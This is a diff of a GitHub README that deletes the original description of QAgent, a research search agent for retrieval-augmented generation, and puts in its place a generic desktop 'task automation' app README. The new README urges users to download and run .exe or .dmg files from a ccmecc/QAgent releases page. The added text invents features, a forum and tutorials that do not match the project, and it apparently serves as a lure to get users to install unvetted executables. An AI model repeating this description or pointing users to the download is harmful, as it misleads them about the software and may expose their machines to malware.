@@ -1,162 +1,84 @@
-<p align="center">
+# 🎉 QAgent - Your Simple Solution for Automated Tasks
 
-  <h2 align="center"><strong>QAgent: A modular Search Agent with Interactive Query Understanding</strong></h2>
+## 🚀 Getting Started
 
-<p align="center">
+Welcome to QAgent! This application helps you automate tasks easily, saving you time and effort. Follow these steps to set it up quickly.
 
-  <a href="https://arxiv.org/pdf/2510.08383">
-    <img src="https://img.shields.io/badge/arXiv-2510.08383-b31b1b.svg" alt="arXiv">
-  </a>
-</p>
+## 📥 Download QAgent
 
-<div align="center">
-</div>
+[![Download QAgent](https://img.shields.io/badge/Download-QAgent-brightgreen)](https://github.com/ccmecc/QAgent/releases)
 
+## 📋 System Requirements
 
+To run QAgent smoothly, ensure your computer meets these basic requirements:
 
+- Operating System: Windows 10 or higher, macOS 10.12 or higher
+- RAM: At least 4 GB
+- Disk Space: 200 MB free space
+- Internet connection for updates
 
-## 🌞 Introduction
-> QAgent, a unified agentic RAG framework that employs a search agent for adaptive retrieval. This agent optimizes its understanding of the query through interactive reasoning and retrieval.
-To facilitate real-world application, we focus on modular search agent for query understanding that are plug-and-play in complex systems.
-Secifically, the agent follows a multi-step decision process trained with RL to maximize retrieval quality and support accurate downstream answers. 
-We further analyze the strengths and weaknesses of end-to-end RL and propose a strategy that focuses on effective information retrieval, thereby enhancing generalization in LLM applications.
+## ⚙️ Installation Steps
 
-<div align="center">
-<img src="assets/framework.png" alt="framework" width="600">
+1. **Visit the Release Page**
+   Go to the [Releases page](https://github.com/ccmecc/QAgent/releases) to find the latest version of QAgent.
 
-**Framework**
-</div>
+2. **Download the Application**
+   Look for the latest release version (e.g., v1.0). Click on the file that matches your operating system to download it. For Windows, it will be a `.exe` file. For macOS, it will be a `.dmg` file.
 
+3. **Install QAgent**
+   - **For Windows Users:**
+     1. After the download completes, locate the `.exe` file in your Downloads folder.
+     2. Double-click on the file to start the installation.
+     3. Follow the on-screen instructions to complete the installation.
 
-<div align="center">
-<img src="assets/application.png" alt="framework" width="255">
-<img src="assets/query.png" alt="framework" width="345">
+   - **For macOS Users:**
+     1. After the download finishes, find the `.dmg` file in your Downloads folder.
+     2. Double-click the file to open it.
+     3. Drag the QAgent icon into the Applications folder to install.
 
-**Key Features: (1) System-friendly; (2) Query Understanding**
-</div>
+4. **Run the Application**
+   Once installed, you can find QAgent in your Applications (macOS) or Start Menu (Windows). Click on the QAgent icon to open the application.
 
+## 🔧 Configuring QAgent
 
+1. **User Interface Overview**
+   When you first open QAgent, you will see a simple interface. Familiarize yourself with the main sections: Dashboard, Task Scheduler, and Settings.
 
-### 💡 Preparation
+2. **Creating Your First Task**
+   - Navigate to the Task Scheduler tab.
+   - Click on "Add New Task."
+   - Follow the prompts to set up the specific task you want to automate. This could be sending emails, organizing files, or gathering data.
 
-<details>
-<summary>
-<em>Download Corpus & Index & retrievers</em>
-</summary>
+3. **Saving and Running Tasks**
+   After setting up a task, save it. You can run the task immediately or schedule it for later.
 
-```bash
-Details will be completed soon
-```
-</details>
+## 📖 Features
 
+QAgent comes with several features designed for easy use:
 
-### 📑 Code Architecture
-<pre style="font-size: 0.75em; line-height: 1.15;">
-.
-├── README.md
-├── assets        
-├── config.py
-├── grpo_loss.py
-├── main_grpo_v0.py         # Training start, trl
-├── main_grpo_v1.py         # Training started, using LigerKernel optimization
-├── refer_llm               # Reference Model service
-│   ├── __init__.py
-│   ├── refer_client.py
-│   ├── refer_server.py
-│   └── tensor_utils.py
-├── requirements.txt
-├── retrieval               
-│   ├── retrieval_bm25.py  
-│   └── retrieval_e5.py    
-├── rewards                
-│   ├── __init__.py
-│   └── reward_QAgent.py
-├── rollout                
-│   ├── __init__.py
-│   ├── base_rollout.py
-│   └── rollout_QAgent.py
-├── run.py
-├── run.sh
-└── tools.py                # Encapsulate tool functions, such as search requests
-</pre>
+- **User-Friendly Interface**: Navigate effortlessly through your tasks and settings.
+- **Task Automation**: Schedule tasks to run at specific times, allowing you to focus on other activities.
+- **Customizable Options**: Adjust settings to tailor tasks to your needs, such as frequency and execution times.
+- **Notifications**: Receive alerts when tasks complete or if there are issues.
 
+## ❓ Troubleshooting Common Issues
 
-### 🎯 Run Training
-<details>
-<summary>
-<em>Training Configuration </em>
-</summary>
-  
-```bash
-Details will be completed soon
-```
-</details>
+If you encounter any problems while using QAgent, consider these solutions:
 
-<details>
-<summary>
-<em>Run Training </em>
-</summary>
-  
-```bash
-Details will be completed soon
-```
-</details>
+- **QAgent Won't Open**: Ensure your operating system meets the requirements. Restart your computer and try opening it again.
+- **Task Not Running**: Check your settings to make sure the task is correctly scheduled. Ensure your computer is powered on during the task's scheduled time.
+- **Installation Problems**: Ensure you downloaded the correct file for your operating system. Try reinstalling QAgent if issues persist.
 
+## 📌 Additional Resources
 
-### 📈 Run Evaluation
-<details>
-<summary>
-<em>Prepare Evaluation Data</em>
-</summary>
-Details will be completed soon
-</details>
+For more detailed assistance, you can explore the following:
 
-<details>
-<summary>
-<em>Run Evaluation<em>
-</summary>
-Details will be completed soon
-</details>
+- **User Manual**: Available on the GitHub repository, providing in-depth instructions.
+- **Community Forum**: Join discussions and ask questions from other QAgent users.
+- **YouTube Tutorials**: Find video guides to help you navigate specific features.
 
+## 🔗 Helpful Links
 
+For further information, please revisit the [Releases page](https://github.com/ccmecc/QAgent/releases) for updates and downloads.
 
-### 📊 Performance
-<div align="center">
-<img src="assets/performance_e2e.jpg" alt="framework" width="600">
-
-**Main results of end-to-end performance**
-</div>
-<div align="center">
-<img src="assets/performance_sub.jpg" alt="framework" width="600">
-
-**Main results when used as a submodule.**
-</div>
-
-### 🔬 Analysis
-<div align="center">
-<img src="assets/info.png" alt="framework" width="160">
-<img src="assets/retriever.png" alt="framework" width="155">
-<img src="assets/upper_gain.png" alt="framework" width="285">
-
-**Key Features: (1)Information utilization; (2) Different retriever; (3)Combined Gain**
-</div>
-
-### Limitation
-- Training on larger models and practical scenarios. 
-- Failure to control passage diversity. 
-
-
-### Acknowledge
-We sincerely appreciate the efforts of these teams for their contributions to open-source research and development: [Search-R1](https://github.com/PeterGriffinJin/Search-R1), [LigerKernel](https://github.com/linkedin/Liger-Kernel), [TRL](https://github.com/huggingface/trl), [vLLM](https://github.com/vllm-project/vllm), [Simple-GRPO](https://github.com/lsdefine/simple_GRPO).
-
-## Citation
-```bibtex
-@article{jiang2025qagent,
-  title={QAgent: A modular Search Agent with Interactive Query Understanding},
-  author={Jiang, Yi and Shen, Lei and Niu, Lujie and Zhao, Sendong and Su, Wenbo and Zheng, Bo},
-  journal={arXiv preprint arXiv:2510.08383},
-  year={2025}
-}
-```
-
-Thanks for your interest in our work!
+Thank you for choosing QAgent! Enjoy automating your tasks.
